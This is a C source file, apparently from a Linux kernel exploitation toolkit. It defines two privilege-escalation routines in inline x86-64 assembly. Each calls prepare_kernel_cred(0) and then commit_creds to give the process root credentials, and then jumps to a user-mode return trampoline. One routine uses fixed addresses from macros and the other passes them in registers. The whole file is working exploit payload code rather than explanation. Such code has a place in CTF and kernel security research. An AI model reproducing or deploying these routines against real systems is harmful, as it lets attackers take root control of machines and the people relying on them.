#include "privesc.h"
#include "utils.h"
#include <sys/types.h>

#define __stringify(x) #x

/* ============= 1 =============
 * Privesc from kernel creds:
 *      commit_creds(prepare_kernel_cred(0));
 *
 * We can use global variables in the assembly,
 *      to avoid program crash due to register clobbers
 */
void _glb_privesc_kcred(void)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        // prepare_kernel_cred
        "movabs rax, " __stringify(PREPARE_KERNEL_CRED_ADDR) ";"
        "xor rdi, rdi;"
        "call rax;"
        // commit_creds
        "mov rdi, rax;"
        "movabs rax, " __stringify(COMMIT_CREDS_ADDR) ";"
        "call rax;"
        // jmp to ret2usr_trampoline or any return stub
        "movabs rax, " __stringify(POST_PRIVESC_JUMP_ADDR) ";"
        "jmp rax;"
        ".att_syntax;"
    );
}

/* 
 * Otherwise, use the most less-used registers
 *      to pass variables to avoid clobber issues
 */
void __privesc_kcred(uintptr_t commit_creds_addr,
                        uintptr_t prepare_kernel_cred_addr,
                        uintptr_t post_privesc_jmp_addr)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        // prepare_kernel_cred*/
        "mov rax, %[pkc];"
        "xor rdi, rdi;"
        "call rax;"
        // commit_creds*/
        "mov rdi, rax;"
        "mov rax, %[cc];"
        "call rax;"
        // jmp to ret2usr_trampoline or any return stub
        "mov rax, %[ret];"
        "jmp rax;"
        ".att_syntax;"
        :
        : [pkc] "r"(prepare_kernel_cred_addr),
          [cc]  "r"(commit_creds_addr),
          [ret] "r"(post_privesc_jmp_addr)
        : "rax", "rdi", "rsi", "rdx", "rcx"
    );
}
